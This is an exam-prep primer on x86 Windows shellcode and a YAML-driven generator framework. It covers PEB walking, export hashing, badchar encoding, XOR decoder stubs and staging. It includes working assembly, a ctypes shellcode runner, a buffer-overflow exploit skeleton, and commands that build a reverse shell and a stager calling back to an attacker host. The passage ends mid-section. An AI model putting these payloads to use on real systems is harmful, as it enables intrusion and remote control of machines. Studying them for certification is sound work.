# Shellcode Primer: From Foundations to the Emitter Framework

A practical guide for OSED students. Covers x86 Windows shellcode (the exam
target), extends to x64 Windows and macOS for independent study, and shows how
every concept maps to the emitter framework in `Tools/emitter/`.

---

## Table of contents

1. [What shellcode actually is](#1-what-shellcode-actually-is)
2. [Position-independent code](#2-position-independent-code)
3. [x86 register and calling conventions](#3-x86-register-and-calling-conventions)
4. [The PEB walk -- finding loaded modules](#4-the-peb-walk----finding-loaded-modules)
5. [Export table resolution by hash](#5-export-table-resolution-by-hash)
6. [String construction without nulls](#6-string-construction-without-nulls)
7. [Badchar encoding](#7-badchar-encoding)
8. [Stack frame layout](#8-stack-frame-layout)
9. [Putting it together: the emitter pipeline](#9-putting-it-together-the-emitter-pipeline)
10. [Writing a custom template](#10-writing-a-custom-template)
11. [XOR encoder and decoder stubs](#11-xor-encoder-and-decoder-stubs)
12. [Staged shellcode](#12-staged-shellcode)
13. [Python as a shellcode workbench](#13-python-as-a-shellcode-workbench)
14. [x64 Windows: what changes](#14-x64-windows-what-changes)
15. [macOS (x86-64 / ARM64): a different world](#15-macos-x86-64--arm64-a-different-world)
16. [Debugging shellcode in WinDbg](#16-debugging-shellcode-in-windbg)
17. [Quick reference tables](#17-quick-reference-tables)

---

## 1. What shellcode actually is

Shellcode is a self-contained sequence of machine instructions designed to run
without the operating system's normal program loader. It cannot rely on:

- An import table (no `GetProcAddress` address handed to it)
- Fixed memory addresses (ASLR randomizes base addresses each boot)
- Relocations (the loader never processes it)
- Null bytes or other characters that the delivery channel filters

Every address the shellcode needs must be derived at runtime. That constraint
produces the distinctive patterns this primer teaches you to write and
recognize.

### The delivery model

```text
 Exploit payload
 +----------------------------------------------+
 | padding | RET overwrite | NOP sled | SHELLCODE |
 +----------------------------------------------+
                    |                       ^
                    +--- EIP redirected ----+
```

The exploit overwrites a return address (or SEH handler, or function pointer)
to redirect execution into your shellcode. The shellcode then bootstraps
everything it needs from scratch.

### Position independence

Shellcode does not know where in memory it will land. Every data reference and
every function address must be computed relative to something the code
discovers at runtime. The two primary techniques:

1. **Register-relative addressing**: `fs:[0x30]` (x86) or `gs:[0x60]` (x64)
   reaches the PEB, which leads to loaded module lists.
2. **call/pop for EIP recovery**: a `call` pushes the next instruction's
   address, which a `pop` captures into a register.

---

## 2. Position-independent code

### call/pop pattern

```asm
    jmp short get_data
callback:
    pop esi              ; ESI = address of "Hello" string
    ; use ESI...
get_data:
    call callback        ; pushes address of the db line
    db "Hello", 0
```

The `call` pushes the address of the byte immediately after itself (the `db`
data). The `pop` captures that address. This is how shellcode references
embedded data without knowing its absolute address.

### Why jmp/call/pop instead of just call/pop?

A forward `call` encodes a positive displacement. If the distance is small,
the upper bytes of the 4-byte displacement are `0x00`. The `jmp short` /
`call backward` pattern produces a negative displacement whose upper bytes
are `0xFF`, avoiding null bytes.

The emitter uses this pattern in its decoder stubs (`xor_encoder.py`). The
framework stubs use a two-hop `jmp short` trampoline for the same reason:

```asm
_start:
    jmp short _stub_trampoline1    ; skip past stub code

; --- framework stubs here (backward call targets) ---

_stub_trampoline1:
    jmp short _stub_trampoline2    ; skip past more stubs

; --- more framework stubs ---

_stub_trampoline2:
    jmp short main                 ; reach the payload
```

Each `jmp short` uses a 1-byte signed displacement (range -128 to +127),
which is inherently null-free.

### FPU-based EIP recovery

An alternative when `call` is filtered:

```asm
    fldz                           ; push 0.0 onto FPU stack
    fnstenv [esp-0x0c]             ; save FPU environment to stack
    pop esi                        ; ESI = address of fldz instruction
    add esi, <offset_to_payload>   ; adjust to point at the encoded payload
```

`fnstenv` saves the FPU state, including the address of the last FPU
instruction executed (`fldz`). The emitter's `xor_encoder.py` uses this as a
fallback when the `call`-based stub cannot avoid badchars (the `call`
instruction byte `0xE8` or displacement bytes collide with the forbidden set).

---

## 3. x86 register and calling conventions

### General-purpose registers

```text
Register   Convention               Typical shellcode use
--------   ----------               --------------------
EAX        Return value             API return values, hash accumulator
EBX        Callee-saved             Module base address (DllBase)
ECX        Counter, arg (fastcall)  Loop counter, scratch
EDX        Scratch, arg (fastcall)  Hash accumulator, scratch
ESI        Callee-saved             Source pointer (lodsb), string ptr
EDI        Callee-saved             Destination pointer (strings)
EBP        Frame pointer            Stack frame base (emitter uses [ebp-N])
ESP        Stack pointer            Grows downward, push/pop
```

### stdcall calling convention (Win32 default)

```asm
; WinExec("calc.exe", SW_SHOWNORMAL)
; Arguments pushed right-to-left

push 0x1                ; uCmdShow = SW_SHOWNORMAL (arg 2)
push eax                ; lpCmdLine = pointer to string (arg 1)
call dword ptr [ebp-NN] ; WinExec (resolved address on stack frame)
; Callee cleans the stack -- ESP is restored by the API itself
```

Key points:
- Arguments are pushed right-to-left (last argument first)
- The callee removes arguments from the stack on return
- Return value is in EAX
- EBX, ESI, EDI, EBP are callee-saved (preserved across calls)
- ECX, EDX are caller-saved (may be trashed by the call)

### How the emitter handles calling convention

The `safe_call_mem` helper in `encode.py` emits the indirect call:

```python
# In a payload template:
from ..encode import safe_call_mem, safe_push_imm, safe_lea

bc = config.badchars
we_off = -layout.slot("WinExec").offset

return "\n".join([
    *safe_lea("eax", "ebp", cmd_off, bc),   # eax = &cmd string
    *safe_push_imm(0x1, bc),                 # push SW_SHOWNORMAL
    "    push eax",                          # push lpCmdLine
    *safe_call_mem("ebp", we_off, bc),       # call [ebp-NN] = WinExec
])
```

The `safe_*` helpers check every byte of the emitted instruction encoding
against the badchar set and substitute XOR-masked alternatives when needed.

---

## 4. The PEB walk -- finding loaded modules

Windows stores information about every loaded DLL in a linked list accessible
through the Process Environment Block (PEB). Shellcode walks this list to
find `kernel32.dll` without calling any API.

### The chain

```text
fs:[0x30]  -->  PEB
                 +0x0C  -->  PEB_LDR_DATA
                              +0x1C  -->  InInitializationOrderModuleList
                                          (doubly-linked list of LDR entries)
```

### Assembly (from `build.py` -- `_emit_framework_stubs_part1a`)

```asm
get_first_ldr_entry:
    xor ecx, ecx                  ; ecx = 0 (avoids null in fs:[0x30])
    mov eax, fs:[ecx + 0x30]      ; EAX = PEB
    mov eax, [eax + 0x0c]         ; EAX = PEB->Ldr (PEB_LDR_DATA)
    mov eax, [eax + 0x1c]         ; EAX = InInitializationOrderModuleList.Flink
    sub eax, 0x10                 ; adjust: Flink points mid-struct, back up
    ret

find_kernel32_entry:
    mov esi, [eax + 0x30]         ; BaseDllName.Buffer (Unicode)
    cmp word ptr [esi], 0x004b    ; 'K'
    jne next
    cmp word ptr [esi+2], 0x0045  ; 'E'
    jne next
    cmp word ptr [esi+12], 0x0033 ; '3' (distinguishes KERNEL32 from KERNELBASE)
    jne next
    mov ebx, [eax + 0x18]         ; DllBase -- EBX = kernel32.dll base address
    ret

next:
    mov eax, [eax + 0x10]         ; follow Flink to next entry
    sub eax, 0x10                 ; re-adjust for struct offset
    jmp find_kernel32_entry
```

### Why `xor ecx, ecx` before `fs:[ecx+0x30]`?

The naive encoding `mov eax, fs:[0x30]` assembles to `64 A1 30 00 00 00` --
three null bytes. Using `ecx` as a zero register and adding `0x30` to it
produces `64 8B 41 30` -- null-free.

### What the emitter does with this

The entire PEB walk is generated by `_emit_framework_stubs_part1a()` and
`_emit_framework_stubs_part1b()` in `build.py`. Every memory access goes
through `safe_mem_load()` from `encode.py`, which checks displacement bytes
against the manifest's badchar set and substitutes register-computed addresses
when a displacement byte is forbidden.

You never write PEB walk code manually. The emitter generates it from the
manifest.

---

## 5. Export table resolution by hash

Once `kernel32.dll`'s base address is in EBX, shellcode parses the PE headers
to find the export directory, then loops through exported function names
comparing a hash of each name against a precomputed target hash.

### PE header traversal (from `_emit_framework_stubs_part1b`)

```asm
get_export_directory:
    mov eax, [ebx + 0x3c]        ; e_lfanew (PE header offset from base)
    add eax, ebx                  ; EAX = PE header absolute address
    mov eax, [eax + 0x78]        ; DataDirectory[0].VirtualAddress (export RVA)
    add eax, ebx                  ; EAX = export directory absolute address
    ret

get_export_tables:
    mov ecx, [eax + 0x18]        ; NumberOfNames
    mov edi, [eax + 0x20]        ; AddressOfNames RVA
    add edi, ebx                  ; absolute
    mov edx, [eax + 0x24]        ; AddressOfNameOrdinals RVA
    add edx, ebx                  ; absolute
    mov esi, [eax + 0x1c]        ; AddressOfFunctions RVA
    add esi, ebx                  ; absolute
    ret
```

### ROR-13 hashing (from `_emit_framework_stubs_part2`)

```asm
compute_hash:
    xor eax, eax
    xor edx, edx                 ; edx = running hash
    cld                           ; direction flag clear for lodsb

hash_loop:
    lodsb                         ; al = next byte from [esi], esi++
    test al, al                   ; null terminator?
    jz hash_done
    ror edx, 0x0d                 ; rotate right by 13
    movzx eax, al                 ; zero-extend byte to dword
    add edx, eax                  ; accumulate
    jmp hash_loop

hash_done:
    ret
```

### How the emitter resolves APIs

The `api_emitter.py` module generates a three-instruction block per function:

```asm
    ; WinExec  [ebp-0x2c]
    mov  eax, 0x0e8afe98          ; precomputed ROR-13 hash of "WinExec"
    call resolve_export_by_hash   ; search exports, return address in EAX
    mov  [ebp-0x2c], eax          ; store resolved pointer on stack frame
```

The hash is computed at build time by `hash_gen.py`:

```python
# Tools/emitter/hash_gen.py
def ror13(name: str) -> int:
    h = 0
    for c in name:
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h
```

For each function in the manifest, `encode_dword(hash_val, badchars, "eax")`
produces a badchar-safe load of the hash constant.

### Loading secondary DLLs

APIs from DLLs other than `kernel32.dll` (for example, `ws2_32.dll` for
Winsock) require an extra step: call `LoadLibraryA` first, then re-point the
export table walker at the new module. The emitter handles this automatically
in `_dll_load_block()`:

1. Push the DLL name string onto the stack
2. Call `LoadLibraryA` (already resolved from kernel32)
3. Store the new module base
4. Call `get_export_directory` / `get_export_tables` / `save_export_context`
5. Resolve the DLL's functions

This is why `LoadLibraryA` auto-appears in the manifest when you use Winsock
or other non-kernel32 APIs.

---

## 6. String construction without nulls

Shellcode cannot embed null-terminated strings as raw data -- the null
terminator (`0x00`) would be filtered. The emitter provides four methods, all
in `Tools/strings.py` and wrapped by `string_emitter.py`:

### Method: `mov` (DWORD-at-a-time writes)

```python
# Python (emitter internals)
result = emit_mov("calc.exe", dest="edi", badchars={0x00, 0x0a, 0x0d})
```

Produces:

```asm
    xor eax, eax
    mov [edi+8], al                ; null terminator (1 byte, via register)
    mov eax, 0x6578652e            ; ".exe" (little-endian)
    mov [edi+4], eax
    mov eax, 0x636c6163            ; "calc"
    mov [edi], eax
```

The string is written backward from the null terminator. Each 4-byte chunk is
loaded into EAX (with badchar encoding if needed) and stored at the
pre-allocated stack slot via `[edi+offset]`.

### Method: `push` (stack push, no pre-allocation needed)

```asm
    xor eax, eax
    push eax                       ; null terminator (4 zero bytes on stack)
    push 0x6578652e                ; ".exe"
    push 0x636c6163                ; "calc"
    ; ESP now points to "calc.exe\0"
```

Compact but ESP-relative, so subsequent pushes change the pointer. Use when
the string is consumed immediately (e.g., as a `LoadLibraryA` argument).

### Method: `shiftor` (shift + OR construction)

Builds each DWORD by shifting and OR-ing byte values. Avoids byte patterns
that `mov` cannot when the DWORD's encoding itself contains badchars:

```asm
    xor eax, eax
    or al, 0x63                    ; 'c'
    shl eax, 8
    or al, 0x61                    ; 'a'
    shl eax, 8
    or al, 0x6c                    ; 'l'
    shl eax, 8
    or al, 0x63                    ; 'c'
    mov [edi], eax
```

### Method: `xor` (XOR-masked DWORDs)

Each DWORD is stored as `(value XOR mask)`, then XOR-decoded with the mask.
Both the encoded value and the mask are computed to be badchar-free:

```asm
    mov eax, 0x6279622d            ; encoded (no badchars)
    xor eax, 0x01010101            ; mask (no badchars)
    mov [edi], eax                 ; result: original DWORD
```

### Manifest declaration

```yaml
strings:
  - label: cmd
    value: calc.exe
    method: mov       # or: push, shiftor, xor
```

The emitter's `string_emitter.py` combines the string method with
`safe_lea("edi", "ebp", -slot.offset, badchars)` to point EDI at the
string's pre-allocated stack slot before writing. The destination register
is always EDI regardless of what the manifest says (the schema accepts a
`dest` field but `string_emitter.py` does not use it).

---

## 7. Badchar encoding

The central problem: specific byte values are stripped, mangled, or
interpreted as control characters during delivery. Common badchars:

| Byte | Reason |
|------|--------|
| `0x00` | C string terminator -- `strcpy` stops copying |
| `0x0a` | Newline (`\n`) -- line-based protocols terminate |
| `0x0d` | Carriage return (`\r`) -- same issue |
| `0x20` | Space -- some parsers split on whitespace |
| `0x09` | Tab -- similar to space |
| `0x25` | Percent -- format string interpreters consume it |
| `0x80`+ | High bytes -- character set conversions corrupt them |

### How the emitter handles badchars

The `encode.py` module is the core. For any immediate value:

```python
def encode_dword(value: int, badchars: set[int], reg: str = "eax") -> list[str]:
    v_bytes = [(value >> (8 * i)) & 0xFF for i in range(4)]
    if not any(b in badchars for b in v_bytes):
        return [f"    mov  {reg}, 0x{value:08x}"]
    # Find per-byte XOR mask where both mask and encoded value are clean
    mask_bytes = [_find_mask_byte(b, badchars) for b in v_bytes]
    mask = sum(m << (8 * i) for i, m in enumerate(mask_bytes))
    encoded = value ^ mask
    return [
        f"    mov  {reg}, 0x{encoded:08x}",
        f"    xor  {reg}, 0x{mask:08x}",
    ]
```

The `_find_mask_byte` function searches for a mask byte `m` where both `m`
and `(original_byte XOR m)` are outside the badchar set. Since each byte has
at most ~10 forbidden values, a valid mask almost always exists.

### Displacement encoding

Memory operands like `[ebp-0x30]` encode the offset `0x30` directly into the
instruction stream. If that byte is forbidden, `safe_mem_load` and
`safe_mem_store` compute the address in a scratch register instead:

```asm
; Normal (0x30 is clean):
    mov eax, [ebp-0x30]

; Encoded (0x30 is forbidden):
    mov ecx, 0xffffffd0        ; -0x30, encoded to avoid badchar
    add ecx, ebp               ; ecx = ebp - 0x30
    mov eax, [ecx]             ; load from computed address
```

### ModRM byte awareness

Even when the displacement is clean, the ModRM byte (the byte that tells the
CPU which registers to use) might itself be a badchar. For example,
`mov eax, [ebp+disp8]` always produces ModRM byte `0x45`. If `0x45` is
forbidden, the emitter falls back to the register-computed form.

This level of awareness is unique to the emitter -- hand-written shellcode
rarely checks ModRM bytes.

---

## 8. Stack frame layout

The emitter reserves a fixed-size stack frame and assigns named slots:

```asm
main:
    mov  ebp, esp              ; frame base
    xor  ecx, ecx
    mov  ch, 0x05              ; ecx = 0x0500
    sub  esp, ecx              ; reserve 0x500 bytes (1280 bytes)
```

### Layout zones (from `stack_alloc.py`)

```text
Offset from EBP    Zone              Contents
-0x04 to -0x18     Export context     PEB walk internals (reserved)
-0x20 +            Module bases       4 bytes per required DLL
after modules      API pointers       4 bytes per resolved function
after APIs         Variables          4 bytes per manifest variable
-0x80 +            Structures         STARTUPINFOA, sockaddr_in, etc.
after structs      Strings            4-byte aligned, null-terminated
```

### How slots are assigned

`stack_alloc.py` builds the layout from the manifest:

```python
@dataclass(frozen=True)
class Slot:
    name: str        # "WinExec", "cmd", "socket_handle"
    offset: int      # positive value -- used as [ebp-offset]
    size: int        # bytes (4 for pointers, struct size, string length)
    category: str    # "module_base", "api", "variable", "structure", "string"

    @property
    def ebp_ref(self) -> str:
        return f"[ebp-{hex(self.offset)}]"
```

Templates reference slots by name:

```python
we_off = -layout.slot("WinExec").offset    # e.g., -0x2c
cmd_off = -layout.slot("cmd").offset       # e.g., -0xa0
```

The convention is that templates never hardcode `[ebp-0xNN]` -- the built-in
templates are tested for this, but it is not enforced at build time. Adding
or removing functions shifts all offsets, so hardcoding one would silently
break. Always use `layout.slot()`, which returns the current value.

### The contract document

Every build produces `contract.md` with the exact layout:

```text
Slot              Category      Offset      ebp_ref       Size
kernel32.dll      module_base   0x20        [ebp-0x20]    4
WinExec           api           0x24        [ebp-0x24]    4
ExitProcess       api           0x28        [ebp-0x28]    4
cmd               string        0x84        [ebp-0x84]    12
```

This is the map you use in WinDbg to verify that each slot contains the
expected value.

---

## 9. Putting it together: the emitter pipeline

### Input: a YAML manifest

```yaml
# Tools/emitter/manifests/calc.yaml
template: run_command
badchars: ["00", "0a", "0d"]
functions:
  - WinExec
  - ExitProcess
strings:
  - label: cmd
    value: calc.exe
    method: mov
```

### Pipeline stages

```text
manifest.yaml
     |
     v
schema.py          Parse + validate YAML
     |
     v
stack_alloc.py     Assign [ebp-N] slots for modules, APIs, structs, strings
     |
     v
build.py           Compose assembly from all emitter components:
  |-- framework stubs   (PEB walk, export resolution -- build.py)
  |-- API resolution    (hash-based resolve + store -- api_emitter.py)
  |-- string constr.    (stack slot writes -- string_emitter.py)
  |-- struct init       (STARTUPINFOA, sockaddr_in -- structure_emitter.py)
  |-- payload template  (push/call sequence -- payload_templates/*.py)
     |
     v
_try_assemble()    Assemble via keystone or nasm
     |
     v
scanner.py         Verify assembled bytes for badchar violations
     |
     v (if --encode)
xor_encoder.py     Wrap in decoder stub if violations remain
     |
     v
write_outputs()    Write .asm, .bin, .hex, .py, .c, contract.md
```

### Running a build

```bash
uv run emitter Tools/emitter/manifests/calc.yaml --out emitter_out/
```

Output:

```text
[+] Generated: emitter_out/asm/generated.asm
[+] Debug:     emitter_out/asm/debug_runner.py
[+] Contract:  emitter_out/Documentation/contract.md
[+] Assembler: keystone
[+] Shellcode: 287 bytes (raw)
[+] Hex:       emitter_out/bin/shellcode.{bin,hex,py,c}
[+] Harness:   emitter_out/bin/test_harness.py
```

### The generated assembly structure

```asm
; AUTO-GENERATED by emitter-v1
; Manifest: Tools/emitter/manifests/calc.yaml
; Template: RunCommandTemplate

    _start:
        jmp short _stub_trampoline1

; -- Framework Stubs (PEB walk, export tables) --
get_first_ldr_entry:
    ...
find_kernel32_entry:
    ...

_stub_trampoline1:
    jmp short _stub_trampoline2

; -- Framework Stubs (hash computation, export resolution) --
compute_hash:
    ...
resolve_export_by_hash:
    ...

_stub_trampoline2:
    jmp short main

main:
    mov  ebp, esp
    xor  ecx, ecx
    mov  ch, 0x05
    sub  esp, ecx

    ; Bootstrap: find kernel32 via PEB walk
    call find_module
    call get_export_directory
    call get_export_tables
    call save_export_context

; -- API Resolution --
    ; WinExec  [ebp-0x24]
    mov  eax, 0x0e8afe98
    call resolve_export_by_hash
    mov  [ebp-0x24], eax

    ; ExitProcess  [ebp-0x28]
    mov  eax, 0x73e2d87e
    call resolve_export_by_hash
    mov  [ebp-0x28], eax

; -- String Construction --
    ; build "calc.exe" at [ebp-0x84]
    ...

; -- Payload (from template) --
    ; WinExec(&cmd, SW_SHOWNORMAL)
    ...

hang:
    jmp hang
```

---

## 10. Writing a custom template

When the exam gives you a scenario the existing templates do not cover, you
write only the push/call sequence. Everything else is generated.

### Step 1: Write the manifest

```yaml
# Tools/emitter/manifests/my_payload.yaml
template: my_payload
badchars: ["00", "0a", "0d"]
functions:
  - SomeFunction
  - AnotherFunction
strings:
  - label: my_string
    value: data.txt
    method: mov
variables:
  - handle
```

### Step 2: Write the template class

```python
# Tools/emitter/payload_templates/my_payload.py
from __future__ import annotations
from .base import PayloadTemplate, TemplateConfig
from ..encode import safe_push_imm, safe_push_mem, safe_lea, safe_call_mem, safe_mem_store

class MyPayloadTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars

        # Get stack offsets for resolved APIs and data
        func_off   = -layout.slot("SomeFunction").offset
        other_off  = -layout.slot("AnotherFunction").offset
        str_off    = -layout.slot("my_string").offset
        handle_off = -layout.slot("handle").offset

        return "\n".join([
            "; -- My Payload --",
            "",
            "    ; SomeFunction(&my_string)",
            *safe_lea("eax", "ebp", str_off, bc),
            "    push eax",
            *safe_call_mem("ebp", func_off, bc),
            "",
            "    ; Save return value",
            *safe_mem_store("ebp", handle_off, "eax", bc),
            "",
            "    ; AnotherFunction(handle, 0)",
            "    xor  eax, eax",
            "    push eax",
            *safe_push_mem("ebp", handle_off, bc),
            *safe_call_mem("ebp", other_off, bc),
            "",
        ])
```

### Step 3: Register

In `build.py`, add to `_load_template()`:

```python
"my_payload": "Tools.emitter.payload_templates.my_payload.MyPayloadTemplate",
```

In `schema.py`, add to `_VALID_TEMPLATES`:

```python
_VALID_TEMPLATES = {
    ...,
    "my_payload",
}
```

### Key rules

1. **Always use `layout.slot(name)`** for stack offsets. Never hardcode
   `[ebp-0xNN]`.
2. **Always use `safe_*` helpers** from `encode.py` for any value that
   touches the instruction stream.
3. **Push arguments right-to-left** (stdcall).
4. **APIs are already resolved** by the time your template code executes.
   Just push args and call.
5. The `probe_slots()` mechanism auto-discovers which APIs your template
   references, so you do not need to declare `REQUIRED_FUNCTIONS` manually.

### The encode.py helper catalog

| Helper | Purpose |
|--------|---------|
| `encode_dword(val, bc, reg)` | Load 32-bit immediate, badchar-safe |
| `encode_word(val, bc, reg)` | Load 16-bit immediate |
| `encode_byte(val, bc, reg)` | Load 8-bit immediate |
| `safe_push_imm(val, bc)` | Push small immediate |
| `safe_push_dword(val, bc)` | Push 32-bit via EAX |
| `safe_push_word_as_dword(val, bc)` | Push 16-bit zero-extended to 32-bit |
| `safe_push_mem(base, off, bc)` | Push `dword ptr [base+off]` |
| `safe_mem_load(dst, base, off, bc)` | Load from `[base+off]` |
| `safe_mem_store(base, off, src, bc)` | Store to `[base+off]` |
| `safe_call_mem(base, off, bc)` | Call via `[base+off]` |
| `safe_lea(dst, base, off, bc)` | Compute address of `[base+off]` |
| `safe_byte_store(base, off, val, bc)` | Store byte, both offset- and value-safe |
| `safe_word_store(base, off, src, bc)` | Store word |
| `safe_dword_store(base, off, src, bc)` | Store dword register |
| `safe_add_imm(reg, val, bc)` | Add immediate |
| `safe_sub_imm(reg, val, bc)` | Subtract immediate |
| `safe_ror_imm(reg, val, bc)` | Rotate right by immediate |

---

## 11. XOR encoder and decoder stubs

When the assembled shellcode still contains badchars in literal instruction
bytes (as opposed to controllable immediates), the entire payload is
XOR-encoded and wrapped in a self-decoding stub.

### Encoding (Python side -- `xor_encoder.py`)

```python
result = xor_encode(raw_shellcode, badchars={0x00, 0x0a, 0x0d})
# result.encoded = decoder_stub + xor_encoded_payload
# result.key = 0x41 (example)
```

The encoder:
1. Tries every key from `0x01` to `0xFF`, skipping keys that are themselves
   badchars.
2. For each key, XOR-encodes the entire payload: `encoded[i] = payload[i] ^ key`
3. Checks that every byte of the encoded payload is clean.
4. Tries to build a decoder stub where every byte (including displacements
   and the key literal) is also clean.
5. Returns `stub + encoded_payload` on success.

### Decoder stub (runs first at execution time)

```asm
; call-based stub layout:
    jmp short call_tag         ; jump forward to call
decoder:
    pop esi                    ; ESI = address of encoded payload (return addr from call)
    xor ecx, ecx
    mov cl, <payload_len>      ; loop counter
decode_loop:
    xor byte ptr [esi], <key>  ; decode one byte in place
    inc esi
    loop decode_loop           ; decrement ecx, jump if not zero
    jmp short payload          ; skip over the call instruction
call_tag:
    call decoder               ; pushes address of encoded payload onto stack
    ; encoded payload bytes start here
```

After the loop completes, the payload is decoded in place and execution falls
through to the now-clean shellcode.

### Padding for badchar avoidance

The stub itself contains displacement bytes that may be badchars. The emitter
inserts neutral padding instructions (`nop`, `cld`, `clc`) at two points to
shift displacements by one byte at a time until a clean combination is found:

```python
# From xor_encoder.py
for pre in range(9):      # padding before jmp
    for mid in range(9):  # padding between mov cl and xor loop
        stub = _build_stub(plen, key, badchars, pre, mid, neutral)
        if stub is not None:
            return stub
```

### FPU fallback stub

When the `call` instruction's opcode byte (`0xE8`) or its displacement lands
on a badchar, the encoder switches to an `fldz`/`fnstenv`-based stub that
avoids `call` entirely:

```asm
    fldz                       ; D9 EE
    fnstenv [esp-0x0c]         ; saves FPU state, including fldz's address
    pop esi                    ; ESI = address of fldz
    add esi, <stub_size>       ; advance to encoded payload
    xor ecx, ecx
    mov cl, <payload_len>
    push esi                   ; save payload address for ret
decode_loop:
    xor byte ptr [esi], <key>
    inc esi
    loop decode_loop
    ret                        ; jump to decoded payload via saved address
```

### CLI usage

```bash
uv run emitter Tools/emitter/manifests/revshell.yaml \
    --lhost 192.168.1.10 --lport 4444 --encode --out emitter_out/
```

The `--encode` flag triggers automatic encoding when badchar violations are
detected in the assembled output.

---

## 12. Staged shellcode

### Why stage?

Exploit buffer space is often limited. A stager is a small (200-400 byte)
shellcode that downloads a larger second-stage payload over the network.

### The emitter's staging model

```text
Stage 1 (stager)                  Stage 2 (full payload)
+------------------+              +--------------------+
| WSAStartup       |              | reverse_shell      |
| WSASocketA       |   TCP conn   | copy_then_run      |
| connect ---------|----------->  | run_command         |
| recv (loop)      |   raw bytes  | (any template)     |
| VirtualAlloc     |              +--------------------+
| jump to stage 2  |
+------------------+
```

### Wire protocol

```text
[4 bytes LE uint32]    payload size
[N bytes]              raw payload
```

### Building a two-stage chain

```bash
# Stage 1: stager connecting to attacker port 9002
uv run emitter Tools/emitter/manifests/tcp_stager.yaml \
    --lhost 192.168.1.10 --lport 9002 --out emitter_out/stage1/

# Stage 2: reverse shell connecting back on port 4444
uv run emitter Tools/emitter/manifests/revshell.yaml \
    --lhost 192.168.1.10 --lport 4444 --out emitter_out/stage2/

# Serve stage 2 shellcode
python Tools/tcp_stage_server.py --port 9002 \
    --file emitter_out/stage2/bin/shellcode.bin

# Listen for the reverse shell
nc -lvp 4444
```

Stage 1 connects to port 9002, receives the stage 2 shellcode into
`VirtualAlloc`-allocated RWX memory, and jumps to it. Stage 2 then executes
the full reverse shell payload.

---

## 13. Python as a shellcode workbench

Python is the natural companion to shellcode development. The emitter is
written entirely in Python, and you use Python for testing, encoding, and
exploit integration.

### struct -- packing binary data

```python
import struct

# Pack an IP address into network byte order (big-endian)
ip = "192.168.1.10"
ip_bytes = bytes(int(x) for x in ip.split("."))
ip_packed = struct.unpack(">I", ip_bytes)[0]  # 0xc0a8010a

# Pack a port number
port = 4444
port_be = struct.pack(">H", port)  # b'\x11\x5c' (network byte order)
port_int = struct.unpack(">H", port_be)[0]  # 0x115c
```

### ctypes -- the test harness

The emitter generates a test harness (`test_harness.py`) that uses `ctypes`
to allocate executable memory and run shellcode on a Windows VM:

```python
import ctypes

shellcode = bytearray(open("shellcode.bin", "rb").read())

kernel32 = ctypes.windll.kernel32
ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

print(f"[+] Shellcode at {ptr:#010x}")
input("Attach WinDbg, then press Enter...")

ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
kernel32.WaitForSingleObject(ht, -1)
```

### keystone -- assembling from Python

```python
from keystone import Ks, KS_ARCH_X86, KS_MODE_32

ks = Ks(KS_ARCH_X86, KS_MODE_32)
code = """
    xor eax, eax
    push eax
    push 0x6578652e
    push 0x636c6163
    mov esi, esp
"""
encoding, count = ks.asm(code)
shellcode = bytes(encoding)
print(f"Assembled {count} instructions, {len(shellcode)} bytes")
print("".join(f"\\x{b:02x}" for b in shellcode))
```

### Badchar scanning in Python

```python
def scan_badchars(data: bytes, badchars: set[int]) -> list[tuple[int, int]]:
    """Return (offset, byte) pairs for each badchar violation."""
    return [(i, b) for i, b in enumerate(data) if b in badchars]

violations = scan_badchars(shellcode, {0x00, 0x0a, 0x0d})
if violations:
    for offset, byte in violations:
        print(f"  BADCHAR 0x{byte:02x} at offset {offset}")
else:
    print("  Clean!")
```

### Exploit skeleton with shellcode

```python
import struct
import socket

# Shellcode (from emitter output)
shellcode = open("emitter_out/bin/shellcode.bin", "rb").read()

# Build exploit buffer
offset = 2236
jmp_esp = struct.pack("<I", 0x625011af)  # jmp esp gadget address
nop_sled = b"\x90" * 16

payload = b"A" * offset
payload += jmp_esp
payload += nop_sled
payload += shellcode

# Deliver
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("target", 9999))
sock.send(payload)
sock.close()
```

---

## 14. x64 Windows: what changes

The emitter does not yet generate x64 shellcode (the `windows_x64` target
in `shellforge/targets/` is a placeholder that raises `NotImplementedError`).
The x64 documentation at `Documentation/windows_x86_shellcode/shellcode_x64.md`
covers the structural differences in detail. This section summarizes the key
changes relevant to writing x64 shellcode by hand or extending the emitter:

### 1. PEB access: GS instead of FS

```asm
; x86
mov eax, fs:[0x30]        ; PEB via FS segment

; x64
mov rax, gs:[0x60]        ; PEB via GS segment
```

All internal PEB/LDR offsets change because pointers are 8 bytes:

| Field | x86 offset | x64 offset |
|-------|-----------|-----------|
| PEB -> Ldr | +0x0C | +0x18 |
| Ldr -> InInitOrder.Flink | +0x1C | +0x30 |
| DllBase from flink | +0x08 | +0x20 |
| BaseDllName.Buffer | +0x20 | +0x50 |

### 2. Calling convention: Microsoft x64 (fastcall)

```asm
; x86 -- all args pushed right-to-left
push arg3
push arg2
push arg1
call fn

; x64 -- first four args in registers, rest on stack
; RSP must be 16-byte aligned BEFORE the call instruction.
; The call itself pushes an 8-byte return address, so RSP should be
; 16-byte aligned at the point of the call (not after it).
mov  rcx, arg1
mov  rdx, arg2
mov  r8,  arg3
mov  r9,  arg4
sub  rsp, 0x28            ; 0x20 shadow space + 0x08 alignment pad
call fn
add  rsp, 0x28
```

Two requirements apply to every x64 call:

1. **Shadow space**: 32 bytes (0x20) of scratch space below the arguments,
   even for functions with fewer than four arguments. The callee may spill
   its register arguments there.
2. **16-byte stack alignment**: RSP must be 16-byte aligned at the point of
   the `call` instruction. Since `call` pushes an 8-byte return address,
   RSP is 16-byte aligned *entering* the callee only if it was 16-byte
   aligned before the `call`. In practice this means reserving 0x28 bytes
   (0x20 shadow + 0x08 alignment) or 0x20 when RSP is already aligned.

### 3. No `pushad` / `popad`

These instructions do not exist in 64-bit mode. Register save/restore must
be done individually:

```asm
; x64 register save
push rbx
push rcx
push rdx
push rdi
push rsi
push r8
push r9
```

### 4. 8-byte slots

Function pointer slots and module base slots are 8 bytes wide instead of 4.
The stack layout offsets double.

### 5. PE header differences

The export directory offset changes:

